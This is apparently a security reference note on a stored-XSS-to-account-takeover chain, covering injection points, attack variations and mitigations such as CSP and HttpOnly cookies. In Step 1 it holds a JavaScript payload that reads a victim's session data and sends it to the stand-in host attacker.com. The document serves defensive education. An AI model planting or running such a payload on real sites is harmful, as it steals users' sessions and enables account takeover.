# XSS to Account Takeover Chain

## Overview

**Pattern:** Stored XSS → Session Hijacking → Account Takeover

**Severity:** High to Critical

**Common in:** Web applications with user-generated content and session management

---

## Chain Steps

### Step 1: Stored XSS

**Type:** Cross-Site Scripting (Stored)

**Description:**
Attacker injects malicious JavaScript payload into user-controllable input that is stored and displayed to other users.

**Common Injection Points:**
- User profile fields (bio, name, avatar URL)
- Comments, reviews, posts
- File uploads (SVG, image metadata)
- Search functionality

**Payload Example:**
```javascript
<script>
fetch('/api/user/session', {credentials: 'include'})
 .then(r => r.json())
 .then(data => {
 fetch('https://attacker.com/steal?session=' + btoa(JSON.stringify(data)));
 });
</script>
```

**Outcome:** XSS payload stored and executes when victim views the content

---

### Step 2: Session Hijacking

**Type:** Session Theft

**Description:**
When an authenticated user (especially admin) views the XSS payload, their session token/cookies are stolen and sent to the attacker.

**Prerequisites:**
- XSS payload successfully stored
- Victim is authenticated
- Victim views the malicious content

**Outcome:** Attacker obtains valid session credentials

---

### Step 3: Account Takeover

**Type:** Authentication Bypass

**Description:**
Attacker uses stolen session to impersonate the victim, gaining full access to their account.

**Prerequisites:**
- Valid session credentials obtained
- Session not expired or invalidated

**Outcome:** Full account access, ability to modify account, access sensitive data

---

## Variations

### Variation 1: XSS → CSRF Token Theft → Privileged Action
- XSS steals CSRF token
- Attacker uses token to perform privileged actions

### Variation 2: XSS → Password Change → Account Lockout
- XSS triggers password change
- Victim locked out of account
- Attacker maintains access

### Variation 3: XSS → API Key Theft → Lateral Movement
- XSS steals API keys from admin panel
- Attacker uses keys to access other systems

---

## Mitigation

1. **Input Validation & Output Encoding**
 - Sanitize all user input
 - Use Content Security Policy (CSP)
 - Encode output properly

2. **Session Security**
 - Use HttpOnly cookies
 - Implement SameSite cookie attribute
 - Rotate session tokens regularly
 - Implement session timeout

3. **Additional Protections**
 - Require re-authentication for sensitive actions
 - Implement CSRF tokens
 - Use Subresource Integrity (SRI)

---

## Real-World Examples

- Many bug bounty reports demonstrate this pattern
- Common in social media platforms
- Frequently found in admin panels

